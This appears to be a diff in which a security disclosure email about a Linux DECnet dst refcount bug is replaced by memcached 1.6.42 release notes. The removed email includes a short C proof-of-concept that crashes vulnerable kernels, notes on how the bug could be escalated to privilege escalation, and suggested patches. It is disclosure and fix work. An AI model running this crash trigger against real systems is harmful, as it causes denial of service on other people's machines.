-## Bug details
-
-This crash is due to the dn_nsp_send function (net/decnet/dn_nsp_out.c) whi=
-ch, first off, causes a Denial of Service by preventing the release of lock=
-s such as the current sock's sk->sk_lock, but could also lead to Local Priv=
-ilege Escalation under certain conditions.
-
-When first starting a connection with a DECnet socket, the connect() handle=
-r __dn_connect, while building a route, ends up calling dst_alloc (net/decn=
-et/dn_route.c:1178) which initializes the dst reference counter to 0 instea=
-d of 1 (see commit 76371d2e3ad1f84426a30ebcd8c3b9b98f4c724f for an explanat=
-ion).
-Later on, dn_insert_route is expected to increase the dst refcount, but in =
-reality, it fails to do so, since dst_hold_and_use (net/decnet/dn_route.c:3=
-47) actually calls atomic_inc_not_zero on dst->__refcnt, which only works i=
-f the refcount is not 0. While the refcount hasn't changed, the dst->_use c=
-ounter is correctly incremented by dst_use_noref.
-
-```c
-static inline void dst_hold(struct dst_entry *dst)
-{
-    BUILD_BUG_ON(offsetof(struct dst_entry, __refcnt) & 63);
-    WARN_ON(atomic_inc_not_zero(&dst->__refcnt) =3D=3D 0);            <=3D=
-=3D=3D
-}
-```
-
-Therefore, a warning gets thrown.
-As a consequence, all the following sk_dst_get(sk) calls will return NULL s=
-ince this function also uses atomic_inc_not_zero, and returns NULL on failu=
-re.
-This condition leads to a NPD at net/decnet/dn_nsp_out.c:92:
-
-```c
-if (dn_route_output_sock(&sk->sk_dst_cache, &fld, sk, 0) =3D=3D 0) {
-    dst =3D sk_dst_get(sk);
-    sk->sk_route_caps =3D dst->dev->features;                        <=3D=
-=3D=3D   dst is NULL
-    goto try_again;
-}
-```
-
-## Exploitation scenarios
-
-Furthermore, the try_again label redirects the execution to the following c=
-ode:
-
-```c
-if (dst) {
-    try_again:
-    skb_dst_set(skb, dst);
-    dst_output(&init_net, skb->sk, skb);        <=3D=3D=3D
-    return;
-}
-```
-
-where the dst->output() function is invoked by dst_output to send the outgo=
-ing packet after the routing decision. In an attacker's ideal conditions, w=
-here the zero page is mappable, this allows arbitrary code execution.
-
-In more modern systems, the previous scenario can be triggered multiple tim=
-es to possibly control other reference counters and thus trigger further vu=
-lnerabilities such as UAF.
-For instance, one could force the sock->file (from __sys_sendto) refcount t=
-o wrap around and eventually free it, though a definitive exploitation tech=
-nique is still under study.
-
-## Vulnerable versions
-
-Linux kernels with DECnet support from Linux-4.12-rc7 (commit 76371d2e3ad1f=
-84426a30ebcd8c3b9b98f4c724f) up to Linux-6.0.19.
-The said subsystem has been removed during the 6.1 merge window because dep=
-recated.
-
-## Proof-of-Concept
-
-The kernel has to be compiled with CONFIG_DECNET=3Dy and should have a DECn=
-et address assigned (echo -n "1.10" > /proc/sys/net/decnet/node_address):
-
-```c
-int main() {
-    int sockfd;
-
-    if ((sockfd =3D socket(AF_DECnet, SOCK_SEQPACKET, DNPROTO_NSP)) =3D=3D =
--1) {
-        perror("socket");
-        exit(-1);
-    }
-    struct sockaddr_dn sockaddr;
-    struct nodeent dp;
-    static struct dn_naddr addr;
-    char *nodename =3D "turtle";
-    addr.a_addr[0] =3D 10 & 0xFF;
-    addr.a_addr[1] =3D (1 << 2) | ((10 & 0x300) >> 8);
-    sockaddr.sdn_family =3D AF_DECnet;
-    sockaddr.sdn_flags  =3D 0x00;
-    sockaddr.sdn_objnum  =3D DNOBJECT_MIRROR;
-    sockaddr.sdn_objnamel  =3D 0x00;
-
-    dp.n_addr =3D (unsigned char *)&addr.a_addr;
-    dp.n_length =3D 2;
-    dp.n_name =3D nodename;
-    dp.n_addrtype =3D AF_DECnet;
-
-    if (connect(sockfd, (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0=
-) {
-        perror("socket");
-        exit(-1);
-    }
-    return 0;
-}
-```
-
-Writing a PoC that returns a root shell on devices without SMAP and vm.mmap=
-_min_addr is also trivial.
-
-## Bug fix
-
-This was my suggested patch:
-
-```diff
---- a/net/decnet/dn_route.c     2023-06-06 15:55:36.615147110 +0200
-+++ b/net/decnet/dn_route.c     2023-06-06 15:56:00.179416949 +0200
-@@ -1175,7 +1175,7 @@ make_route:
-        if (dev_out->flags & IFF_LOOPBACK)
-                flags |=3D RTCF_LOCAL;
-
--       rt =3D dst_alloc(&dn_dst_ops, dev_out, 0, DST_OBSOLETE_NONE, 0);
-+       rt =3D dst_alloc(&dn_dst_ops, dev_out, 1, DST_OBSOLETE_NONE, 0);
-        if (rt =3D=3D NULL)
-                goto e_nobufs;
-```
-
-Also, always make sure that dst isn't NULL after sk_dst_get:
-
-```diff
---- a/net/decnet/dn_nsp_out.c   2023-06-06 22:01:57.212802584 +0200
-+++ b/net/decnet/dn_nsp_out.c   2023-06-06 22:04:37.138709847 +0200
-@@ -89,7 +89,9 @@ try_again:
-        fld.flowidn_proto =3D DNPROTO_NSP;
-        if (dn_route_output_sock(&sk->sk_dst_cache, &fld, sk, 0) =3D=3D 0) {
-                dst =3D sk_dst_get(sk);
--               sk->sk_route_caps =3D dst->dev->features;
-+               if (!dst)
-+                       return;
-+               sk->sk_route_caps =3D dst->dev->features;
-                goto try_again;
-        }
-```
-
-The DECnet subsystem has been officially removed from all longterm and stab=
-le kernel series, starting from 4.14.319, 4.19.287, 5.4.248, 5.10.185 and 5=
-.15.118.
-
-Best regards,
-
-Davide Ornaghi
-
---_000_92b180310a434c8bbca9b2449180d85dbetrustedit_--
+https://github.com/memcached/memcached/wiki/ReleaseNotes1642 reveals:
+> Memcached 1.6.42 Release Notes
+> 
+> Date: 2026-5-18
+> 
+> Download
+> --------
+> http://www.memcached.org/files/memcached-1.6.42.tar.gz
+> 
+> Overview
+> --------
+> This is a major security focused release. Nearly all of the fixes are security
+> related for issues that can cause memory corruption, crashes, and so on.
+> 
+> If you submitted a security report that ended up being value, you are credited
+> in the commit history.
+> 
+> If you submitted a security report and do not see it here, it was either not a
+> security bug or I missed it.
+> 
+> Due to the very high volume of security reports in this round I did not give
+> them the individual scrutiny that I typically do: if there was a clear bug, it
+> was fixed, but no effort was made to validate the potential impact of the bug.
+> 
+> Most of the these bugs look extremely obscure, and are impossible to trigger
+> without convoluted configurations. This does not apply to all of the bugs:
+> if memcached can be accessed easily by an attacker it can be crashed.
+> 
+> Similarly I have not created CVE's for any of these as that requires
+> understanding the severity of each bug. In most cases these submissions
+> vastly overstated the severity of the bug. I leave it up to the submitters
+> to request their own CVE's if they wish.
+> 
+> Upgrading is strongly advised, regardless. Thanks to everyone who submitted
+> reports and for your patience in allowing me to collect the fixes all at once.
+> 
+> Fixes
+> -----
+>   - vendor: Instructively warn if vendor blob missing
+>   - proxy: fix write length in extstore miss
+>   - Fix timing side-channel in SASL password database authentication
+>   - proto: fix signed overflow in bodylen for binprot
+>   - proxy: fix underflow with 0 length values
+>   - auth: fix data race during reload
+>   - auth: fix crash when given huge token
+>   - proto: fix crash in binary protocol
+>   - core: fix crashes from slabs reassign
+>   - proxy: check result of buffer parse in match_res
+>   - proxy: fix memory underread when nulling requests
+>   - update data block protocol description to no longer reference obsolete S flag
+> 
+> New Features
+> ------------
+> None.
+> 
+> Contributors
+> ------------
+> The following people contributed to this release since 1.6.41.
+> 
+> Note that this is based on who contributed changes, not how they were done.
+> In many cases, a code snippet on the mailing list or a bug report ended up
+> as a commit with your name on it.
+> 
+> Note that this is just a summary of how many changes each person made which
+> doesn't necessarily reflect how significant each change was. For details on
+> what led up into a branch, either grab the git repo and look at the output
+> of git log 1.6.41..1.6.42 or use a web view.
+> 
+>   - Repo list: https://github.com/memcached/memcached/wiki/DevelopmentRepos
+>   - Web View: http://github.com/memcached/memcached/commits/1.6.42
+> 
+>      8	dormando
+>      2	Bujna, Igor
+>      1	Alec Stewart
+>      1	Sarthak Munshi
